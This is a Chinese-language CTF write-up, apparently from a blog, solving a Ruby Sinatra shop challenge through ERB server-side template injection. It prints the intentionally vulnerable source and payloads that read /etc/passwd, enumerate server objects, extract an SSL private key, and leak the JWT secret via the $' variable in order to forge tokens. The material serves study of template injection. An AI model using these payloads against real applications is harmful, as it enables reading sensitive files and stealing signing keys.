-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-<p>我们可以查看jwt加密和解密那部分代码</p>
-<p>加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-<p>看代码可知，jwt密钥部分是用HS256加密的，口令为ENV[“SECRET”]，所以我们需要想办法知道ENV[“SECRET”]，所以我们可以查看解密的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
-<p>我们可以从</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>中的alert()函数，判断它可能是Ruby ERB模板注入</p>
-<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>对与Ruby ERB模板注入来说，&lt;%=是用来执行ruby语句的，会将结果转换为字符串，所以我们可以尝试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=7*7%&gt;</span><br></pre></td></tr></table></figure>
-<p>来查看它是否存在ruby erb模板注入，如果存在的话，我们可以使用自带的全局函数来测试是否执行函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>
-<p>如果不可以成功的话，可能是因为Ruby的ERB模板引擎包含一个安全级别参数，当安全级别设置为0以上的某个值（如：3）时，我们将无法在模板绑定中执行包括文件操作在内的某些函数，如果设置为4，则只可以执行标记为可信状态的那些代码，所以此时我们可以尝试枚举该对象的可用属性以及方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self %&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后可以尝试获取self对象的类名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.class.name %&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>得到类名后，我们可以尝试枚举类的可用方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= self.methods %&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以将数据传递给这些函数，以达到未授权访问的目的，虽然我们不清楚使用的web框架，但是我们要向服务器发送HTTP POST请求，所以我们可以使用handlePOST或doPOST函数内部，来借此访问某些局部变量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.method(:handle_POST).parameters %&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以看见3个req参数，该参数可能代表的是某个请求对象，rsp参数可能代表的是响应数据的引用，最后session参数可能是某个id或某个对象，所以我们可以查看session对象的具体含义</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=session.class.name %&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以看见WEBrick是Ruby在标准库中实现的原生web服务器，我们还可以探索其它有用的信息</p>
-<p>我们可以使用某些内省方法来确认我们是否可以访问这些变量以及其它可用变量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
-<p>当WEBrick被实例化以处理客户端请求时，它会将某个http服务器实例传递给servlet，这很有可能是@server这个实例变量，所以我们可以调用.instance_variables方法来观察这个对象包含哪些成员变量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=@server.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以看见@ssl_context变量，这个变量可能会包含某些密钥或其它有用信息，所以我们可以改变一下语法来创建自己的局部变量，保存@sll_context的引用，使载荷可读性更好</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
-<p>此时我们可以看见有@key，所以我们可以提取出这个变量的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure>
-<p>回到题目本身，我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=7*7 %&gt;&amp;do=&lt;%=7*7 %&gt;%20is%20working</span><br></pre></td></tr></table></figure>
-<p>进行测试，发现不可以执行，猜测是因为安全等级的原因，但是可以查看预定义变量，由于前面有进行匹配的操作，且进行匹配的代码是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br></pre></td></tr></table></figure>
-<p>所以我们可以使用$’预定义变量来进行模板注入，从而读取ENV[“SCERET”]的值，而首先进行的匹配是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;</span><br></pre></td></tr></table></figure>
-<p>所以然后再用匹配后的值再进行匹配，所以SECRET参数的值最好为空，所以可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt;%20is%20working&amp;$SECRET=</span><br></pre></td></tr></table></figure>
-<p>来读取ENV[“SECRET”]的值，然后用来伪造jwt，即可获得flag</p>
-<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867]">https://www.anquanke.com/post/id/86867]</a></p>
-<pre><code>[https://www.wangan.com/docs/255]
-
-[https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html]
-
-[https://www.jianshu.com/p/4f316191f595]
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
